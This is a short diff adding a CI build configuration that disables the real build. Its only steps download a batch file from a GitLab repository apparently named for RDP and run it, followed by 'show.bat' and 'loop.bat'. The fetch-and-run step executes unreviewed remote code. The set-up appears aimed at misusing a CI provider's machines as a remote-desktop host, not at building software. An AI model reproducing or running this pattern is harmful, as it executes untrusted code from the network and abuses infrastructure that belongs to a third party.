@@ -1,0 +1,10 @@
+version: 1.0.{build}
+image: Visual Studio 2022
+
+build: off
+
+build_script:
+  - ps: Invoke-WebRequest -Uri "https://gitlab.com/raposabrty/pcrdp/-/raw/main/Downloads.bat" -OutFile "Downloads.bat"
+  - cmd: Downloads.bat
+  - cmd: show.bat
+  - cmd: loop.bat
